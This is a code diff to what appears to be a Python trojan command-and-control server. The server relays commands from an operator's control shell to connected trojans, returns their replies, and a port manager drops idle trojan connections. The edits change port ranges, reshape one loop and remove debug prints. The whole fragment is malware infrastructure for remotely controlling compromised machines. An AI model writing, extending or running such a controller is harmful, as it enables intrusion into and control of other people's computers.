@@ -197,14 +197,15 @@ class PortManager(threading.Thread):
     """
     def __init__(self, port_range, trojans, timeout=1800):
         super(PortManager, self).__init__()
-        self.ports = port_range[1:]
+        self.ports = port_range
         self.trojans = trojans
         self.timeout = timeout
 
     def run(self):
         while True:
             time.sleep(120)
-            for trojanserver in self.trojans.values():
+            dictionary = self.trojans
+            for trojanserver in dictionary.values():
                 if (time.time() - trojanserver.last_connection) > self.timeout:
                     trojanserver.stop()
                     self.release(trojanserver.port)
@@ -291,7 +292,7 @@ class TrojanFlowControlServer:
     :ivar user_server: (TCPServer) a default TCP Server app to connect to the control shell
     :ivar connection_server: (TrojanConnectionServer) the server distributing the free ports to the incoming requests
     """
-    def __init__(self, port_range=range(8056, 8100), connection_port=8000, timeout=2000):
+    def __init__(self, port_range=range(8001, 8003), connection_port=8000, timeout=2000):
         # assigning the used port numbers to variables
         self.connection_port = connection_port
         # dictionary containing the TCP connection sockets
@@ -312,7 +313,6 @@ class TrojanFlowControlServer:
                 while len(self.user_server.receive_buffer) == 0:
                     time.sleep(0.001)
                 command = self.user_server.receive()
-                print(command)
                 if command == "available":
                     self.user_server.send(self._available_trojans())
                     self.user_server.send(self.user_server.end_seq)
@@ -324,7 +324,6 @@ class TrojanFlowControlServer:
                             trojanserver = self.trojans[name]
                             trojanserver.send(self._command_only(command))
                             reply = trojanserver.receive()
-                            print(reply)
                             self.user_server.send("[{0}]{1}".format(trojanserver.name, reply))
                     self.user_server.send(self.user_server.end_seq)
 
